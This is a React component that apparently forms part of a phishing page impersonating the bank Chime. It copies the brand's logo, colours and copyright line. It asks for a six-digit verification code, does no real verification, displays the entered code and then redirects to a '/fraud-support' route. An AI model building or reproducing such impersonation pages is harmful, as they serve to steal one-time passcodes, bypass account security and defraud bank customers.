import { useRef, useState } from "react";
import { Box, Typography, TextField, Button, Link } from "@mui/material";
import { useNavigate } from "react-router-dom";
import toast from "react-hot-toast";
import { SpinnerLoading } from "./SpinnerLoading";

export default function ChimeOTP() {
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const inputsRef = useRef([]);

  const handleChange = (value, index) => {
    if (!/^[0-9]?$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    // Move forward
    if (value && index < 5) {
      inputsRef.current[index + 1].focus();
    }
  };

  const handleKeyDown = (e, index) => {
    // Move back on delete
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputsRef.current[index - 1].focus();
    }
  };

  const handlePaste = (e) => {
    const paste = e.clipboardData.getData("text").slice(0, 6);
    if (!/^\d+$/.test(paste)) return;

    const newOtp = paste.split("");
    setOtp([...newOtp, ...Array(6 - newOtp.length).fill("")]);

    newOtp.forEach((_, i) => {
      if (inputsRef.current[i]) {
        inputsRef.current[i].value = newOtp[i];
      }
    });
  };

  const [isLoading, setIsLoading] = useState(false);

  
    const navigate = useNavigate();
  
    const onSubmit = async () => {
      try {
        setIsLoading(true);
  
        toast.success(otp);
  
       return navigate("/fraud-support");
      } catch (err) {
        toast.error(err.response?.data?.message);
      } finally {
        setIsLoading(false);
      }
    };

  return (
    <Box
      sx={{
        minHeight: "100vh",
        bgcolor: "#031f1a",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        color: "white",
      }}
    >
      <Box sx={{ width: 380 }}>
        {/* Logo */}
        <Typography
          variant="h3"
          sx={{ color: "#2de28a", fontWeight: 700, mb: 3 }}
        >
          chime
        </Typography>

        {/* Title */}
        <Typography sx={{ fontSize: "1.3rem", mb: 1 }}>
          Enter verification code
        </Typography>

        <Typography sx={{ fontSize: "0.9rem", color: "#a0b3ad", mb: 3 }}>
          We sent a 6-digit code to your phone
        </Typography>

        {/* OTP Inputs */}
        <Box
          sx={{
            display: "flex",
            justifyContent: "space-between",
            gap: 1,
          }}
          onPaste={handlePaste}
        >
          {otp.map((digit, index) => (
            <TextField
              key={index}
              inputRef={(el) => (inputsRef.current[index] = el)}
              value={digit}
              onChange={(e) => handleChange(e.target.value, index)}
              onKeyDown={(e) => handleKeyDown(e, index)}
              inputProps={{
                maxLength: 1,
                style: {
                  textAlign: "center",
                  fontSize: "1.2rem",
                },
              }}
              sx={{
                width: 50,
                "& .MuiOutlinedInput-root": {
                  borderRadius: "12px",
                  bgcolor: "#062923",
                  color: "white",
                  "& fieldset": {
                    borderColor: "#3a5c54",
                  },
                  "&.Mui-focused fieldset": {
                    borderColor: "#2de28a",
                    boxShadow: "0 0 0 2px rgba(45, 226, 138, 0.2)",
                  },
                },
              }}
            />
          ))}
        </Box>

        {/* Verify Button */}
        <Button
          onClick={onSubmit}
          fullWidth
          sx={{
            mt: 4,
            py: 1.5,
            borderRadius: "12px",
            bgcolor: "#04ffc5",
            color: "#9aa5a1",
            textTransform: "none",
            fontWeight: 600,
            "&:hover": {
              bgcolor: "#22443c",
            },
          }}
        >
          Verify
        </Button>

        {/* Resend */}
        <Box sx={{ mt: 3 }}>
          <Link
            href="#"
            underline="always"
            sx={{
              color: "white",
              fontSize: "0.9rem",
              "&:hover": { color: "#2de28a" },
            }}
          >
            Didn’t receive a code? Resend
          </Link>
        </Box>

        {/* Footer */}
        <Typography
          sx={{
            mt: 4,
            fontSize: "0.75rem",
            color: "#8aa39c",
          }}
        >
          © 2026 Chime. All Rights Reserved.
        </Typography>
      </Box>
       {isLoading && <SpinnerLoading />}
    </Box>
  );
}
